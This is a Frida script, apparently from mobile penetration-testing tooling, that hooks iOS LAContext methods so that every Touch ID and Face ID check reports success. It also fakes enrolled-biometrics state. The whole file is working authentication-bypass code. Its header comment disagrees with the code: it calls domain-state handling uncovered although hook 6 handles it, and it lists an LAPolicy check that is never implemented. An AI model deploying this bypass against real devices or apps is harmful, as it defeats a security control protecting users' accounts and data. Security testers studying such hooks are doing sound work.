/*
 * bypass_biometric.js
 *
 * Neutralises LocalAuthentication (Touch ID / Face ID) prompts by forcing
 * every evaluation call to report success. Covers the APIs the vast
 * majority of iOS apps actually use:
 *
 *   1. LAContext -canEvaluatePolicy:error:      -> always YES
 *   2. LAContext -evaluatePolicy:localizedReason:reply:           -> reply(YES, nil)
 *   3. LAContext -evaluateAccessControl:operation:localizedReason:reply:
 *                                               -> reply(YES, nil)
 *   4. LAContext -evaluatePolicy:options:reply: (iOS 13+, newer overload)
 *   5. LAContext -evaluateAccessControl:operation:options:reply:
 *   6. LAPolicy checks via the class cluster
 *
 * Some apps additionally gate access on `LAContext.canEvaluatePolicy`
 * returning YES *before* they will even call evaluate — that's why both
 * the "can" and "evaluate" entry points are patched.
 *
 * Not covered (rare): apps that call the lower-level
 * `LAContext.evaluatedPolicyDomainState` to detect "no biometrics
 * enrolled". If you see that, hook it to return a non-nil dummy value.
 */

if (!ObjC.available) {
    send("[biometric-bypass] Objective-C runtime not available — skipping.");
} else {
    var LAContext = ObjC.classes.LAContext;
    if (!LAContext) {
        send("[biometric-bypass] LAContext not present in this process.");
    } else {
        // -----------------------------------------------------------------
        // 1) canEvaluatePolicy:error:
        // -----------------------------------------------------------------
        try {
            var canEval = LAContext["- canEvaluatePolicy:error:"];
            if (canEval) {
                Interceptor.attach(canEval.implementation, {
                    onLeave: function (retval) {
                        send("[biometric-bypass] canEvaluatePolicy:error: -> YES");
                        retval.replace(ptr(1));
                    }
                });
            }
        } catch (e) {
            send("[biometric-bypass] canEvaluatePolicy hook failed: " + e);
        }

        // -----------------------------------------------------------------
        // 2) evaluatePolicy:localizedReason:reply:
        //    args: [0]=self [1]=sel [2]=policy [3]=reason [4]=reply block
        // -----------------------------------------------------------------
        try {
            var evalPolicy = LAContext["- evaluatePolicy:localizedReason:reply:"];
            if (evalPolicy) {
                Interceptor.attach(evalPolicy.implementation, {
                    onEnter: function (args) {
                        try {
                            var reply = new ObjC.Block(args[4]);
                            reply.implementation(1, NULL);   // (success=YES, error=nil)
                            send("[biometric-bypass] evaluatePolicy:localizedReason:reply: -> reply(YES, nil)");
                        } catch (e) {
                            send("[biometric-bypass] reply block failed: " + e);
                        }
                    }
                });
            }
        } catch (e) {
            send("[biometric-bypass] evaluatePolicy hook failed: " + e);
        }

        // -----------------------------------------------------------------
        // 3) evaluateAccessControl:operation:localizedReason:reply:
        //    args: [0]self [1]sel [2]accessControl [3]op [4]reason [5]reply
        // -----------------------------------------------------------------
        try {
            var evalAC = LAContext["- evaluateAccessControl:operation:localizedReason:reply:"];
            if (evalAC) {
                Interceptor.attach(evalAC.implementation, {
                    onEnter: function (args) {
                        try {
                            var reply = new ObjC.Block(args[5]);
                            reply.implementation(1, NULL);
                            send("[biometric-bypass] evaluateAccessControl:operation:localizedReason:reply: -> reply(YES, nil)");
                        } catch (e) {
                            send("[biometric-bypass] evalAC reply block failed: " + e);
                        }
                    }
                });
            }
        } catch (e) {
            send("[biometric-bypass] evaluateAccessControl hook failed: " + e);
        }

        // -----------------------------------------------------------------
        // 4) evaluatePolicy:options:reply:  (iOS 13+)
        //    args: [0]self [1]sel [2]policy [3]options [4]reply
        // -----------------------------------------------------------------
        try {
            var evalPolicyOpts = LAContext["- evaluatePolicy:options:reply:"];
            if (evalPolicyOpts) {
                Interceptor.attach(evalPolicyOpts.implementation, {
                    onEnter: function (args) {
                        try {
                            var reply = new ObjC.Block(args[4]);
                            reply.implementation(1, NULL);
                            send("[biometric-bypass] evaluatePolicy:options:reply: -> reply(YES, nil)");
                        } catch (e) {
                            send("[biometric-bypass] evalPolicyOpts reply failed: " + e);
                        }
                    }
                });
            }
        } catch (e) {
            send("[biometric-bypass] evaluatePolicy:options:reply: hook failed: " + e);
        }

        // -----------------------------------------------------------------
        // 5) evaluateAccessControl:operation:options:reply:  (iOS 13+)
        // -----------------------------------------------------------------
        try {
            var evalACOpts = LAContext["- evaluateAccessControl:operation:options:reply:"];
            if (evalACOpts) {
                Interceptor.attach(evalACOpts.implementation, {
                    onEnter: function (args) {
                        try {
                            var reply = new ObjC.Block(args[5]);
                            reply.implementation(1, NULL);
                            send("[biometric-bypass] evaluateAccessControl:operation:options:reply: -> reply(YES, nil)");
                        } catch (e) {
                            send("[biometric-bypass] evalACOpts reply failed: " + e);
                        }
                    }
                });
            }
        } catch (e) {
            send("[biometric-bypass] evaluateAccessControl:operation:options:reply: hook failed: " + e);
        }

        // -----------------------------------------------------------------
        // 6) Fake a non-nil evaluatedPolicyDomainState so apps that
        //    "verify biometrics are enrolled" don't bail out early.
        // -----------------------------------------------------------------
        try {
            var stateGetter = LAContext["- evaluatedPolicyDomainState"];
            if (stateGetter) {
                Interceptor.attach(stateGetter.implementation, {
                    onLeave: function (retval) {
                        if (retval.isNull()) {
                            // A 32-byte NSData is what a real enrolled context returns;
                            // any non-nil value is enough for detection bypass here.
                            var fake = ObjC.classes.NSData.dataWithBytes_length_(
                                Memory.alloc(32).writeByteArray([0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,
                                                                 16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]),
                                32
                            );
                            retval.replace(fake);
                            send("[biometric-bypass] evaluatedPolicyDomainState -> fake non-nil NSData");
                        }
                    }
                });
            }
        } catch (e) {
            // Not fatal — many apps never touch this.
        }
    }
}

send("[biometric-bypass] Hooks installed.");
